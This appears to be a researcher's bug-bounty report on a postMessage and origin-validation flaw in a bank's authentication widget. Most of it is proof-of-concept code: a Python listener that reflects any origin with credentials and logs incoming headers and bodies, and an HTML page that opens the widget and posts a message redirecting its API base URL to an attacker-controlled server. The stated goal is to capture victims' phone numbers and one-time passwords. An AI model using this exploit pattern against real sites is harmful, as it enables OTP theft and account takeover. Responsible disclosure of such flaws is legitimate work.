## 9th-Report
* This is my 9th report when I come backed after 2 months of break
* I was visiting bank subdomains and I found another authentication subdomain which is also connected to main domains
* I intercepted whole requests and I see there's no properly CORS managment issue and also many other issues I don't want to show here from this an attacker can send live number and otp to thier server
* I reviewed source code and found origin validation bug
* I am not allowed to show code here
* Then I created my own server and POC to prove

```
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def _cors_headers(self):
        origin = self.headers.get('Origin', '*')
        self.send_header('Access-Control-Allow-Origin', origin)
        self.send_header('Access-Control-Allow-Credentials', 'true')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        ## I removed headers from here

    def _handle(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace') if length else ''
        print("\n" + "="*60)
        print(f"{self.command} {self.path}")
        print("Headers:", dict(self.headers))
        print("Body:", body)
        print("="*60 + "\n")

        self.send_response(200)
        self._cors_headers()
        self.send_header('Content-Type', 'application/json')
        self.end_headers()

        ## Removed sensivtive path
            resp = {
                ## REMOVED
            }
        ## Removed sensivtive path
            resp = {"complete": True}
        else:
            resp = {"complete": False, "possibleChallenges": []}

        self.wfile.write(json.dumps(resp).encode())

    def do_GET(self): self._handle()
    def do_POST(self): self._handle()
    def do_OPTIONS(self):
        self.send_response(200)
        self._cors_headers()
        self.end_headers()

HTTPServer(('0.0.0.0', 5000), Handler).serve_forever()

```

* Then i also created a poc in html 

```
<!DOCTYPE html>
<html>
<head><title>PoC -API Hijack</title></head>
<body>
<h3>PoC: REMOVED</h3>
<button onclick="openAndAttack()">REMOVEDL</button>
<div id="log" style="white-space:pre-wrap; font-family:monospace; margin-top:20px;"></div>

<script>
let targetWindow = null;

function log(msg) {
  document.getElementById('log').textContent += msg + "\n";
}

function openAndAttack() {
  targetWindow = window.open('REMOVED', 'widget', 'width=500,height=700');
  log("Opened window, waiting for load...");

  setTimeout(() => {
    log("REMOVED...");
    targetWindow.REMOVED({
      type: "REMOVED",
      payload: {
        confirmationId: "REMOVED",
        apiBaseUrl: "your-server/",
        locale: "en",
        timezone: "REMOVED",
        authorization: "fake-session-token",
        showCloseButton: true,
        possibleChallenges: {
          nextChallenge: [
            { type: "CHALLENGE_OTP", data: { communicati: "sms" } }
          ]
        }
      }
    }, "*");
    ## LOG REMOVED
  }, 3000);
}
</script>
</body>
</html>

```

* And i found that the main domain really sending otps and number to my controlled domains then I reported this bug but unfortunately you can seee result

